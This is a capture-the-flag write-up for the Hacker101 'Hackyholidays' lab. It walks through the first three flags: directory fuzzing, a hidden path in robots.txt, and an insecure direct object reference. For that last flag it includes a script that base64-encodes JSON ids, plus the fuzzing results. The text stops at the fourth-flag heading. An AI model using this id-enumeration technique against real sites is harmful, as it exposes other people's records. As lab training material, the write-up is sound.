# Hackyholidays CTF

## Description
This write up will show how to solve the CTF for "Hackyholidays CTF"

**Difficulty:** Moderate

## Solution 1st flag
Fuzzing for files and directories, I get the following result:</br>
```
assets
favicon.ico
forum
robots.txt
```
When going to `https://c7e947b150b633c436c698e00271600a.ctf.hacker101.com/robots.txt`, it will show the first flag.</br>

## Solution 2nd flag
When go to robots.txt, besides the flag, it shows another hidden directory: `/s3cr3t-ar3a`</br>
Going to `https://c7e947b150b633c436c698e00271600a.ctf.hacker101.com/s3cr3t-ar3a`, it will show the page has moved.</br>
In Burp it doesn't show, but in Elements inspector, it shows the flag.</br>

## Solution 3rd flag
In `/s3cr3t-ar3a`, it also shows a next-page `apps-home`</br>
In `/apps-home`, it shows the boxes of all the different challenges:</br>
```
3 /people-rater: The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!
4 /swag-shop: Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.
5 /secure-login: Try and find a way past the login page to get to the secret area.
6 /my-diary: Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?
7 /hate-mail-generator: Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!
8 /forum: The Grinch thought it might be a good idea to start a forum but nobody really wants to chat to him. He keeps his best posts in the Admin section but you'll need a valid login to access that!
9 /evil-quiz: Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!
10 /signup-manager: You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!
```
Looking at `/people-rater`, it shows a list of people. When clicked on a person it will show a Javascript alert with the Grinch's opinion of that person.</br>
When inspecting the Javascript code, it refers to `/entry/?id=` + the data-id.</br>
The id's seem to be base64 encoded. Hence, first I decoded one example to understand what the encoded string contains: `{"id":1}`</br>
I had a list of 1000 numbers, hence I created a Python script to use that list to create a list in the above format:
```
import base64

# Read numbers from file
with open('1000_numbers.txt', 'r') as file:
    numbers = [int(line.strip()) for line in file]

# Convert numbers to base64
base64_list = [base64.b64encode((str('{"id":') + str(num) + str('}')).encode()).decode() for num in numbers]

# Save base64 representations to file
with open('1000_numbers_base64.txt', 'w') as output_file:
    for base64_num in base64_list:
        output_file.write(base64_num + '\n')
```
Once I had the list, I fuzz the id's, with the following result:</br>
```
eyJpZCI6OH0=            [Status: 200, Size: 62, Words: 2, Lines: 1]
eyJpZCI6M30=            [Status: 200, Size: 66, Words: 2, Lines: 1]
eyJpZCI6MTV9            [Status: 200, Size: 62, Words: 2, Lines: 1]
eyJpZCI6Nn0=            [Status: 200, Size: 68, Words: 2, Lines: 1]
eyJpZCI6Mn0=            [Status: 200, Size: 57, Words: 2, Lines: 1]
eyJpZCI6MTF9            [Status: 200, Size: 69, Words: 2, Lines: 1]
eyJpZCI6MTN9            [Status: 200, Size: 62, Words: 2, Lines: 1]
eyJpZCI6N30=            [Status: 200, Size: 66, Words: 2, Lines: 1]
eyJpZCI6NX0=            [Status: 200, Size: 63, Words: 2, Lines: 1]
eyJpZCI6MTB9            [Status: 200, Size: 66, Words: 2, Lines: 1]
eyJpZCI6NH0=            [Status: 200, Size: 62, Words: 2, Lines: 1]
eyJpZCI6MTd9            [Status: 200, Size: 64, Words: 2, Lines: 1]
eyJpZCI6MTR9            [Status: 200, Size: 58, Words: 2, Lines: 1]
eyJpZCI6MTJ9            [Status: 200, Size: 59, Words: 2, Lines: 1]
eyJpZCI6MX0=            [Status: 200, Size: 169, Words: 6, Lines: 1]
eyJpZCI6OX0=            [Status: 200, Size: 66, Words: 2, Lines: 1]
eyJpZCI6MTZ9            [Status: 200, Size: 62, Words: 2, Lines: 1]
```
One line item stands out with the size: `eyJpZCI6MX0=`</br>
Going to `/people-rater/entry/?id=eyJpZCI6MX0=` it will show the flag.</br>

## Solution 4th flag
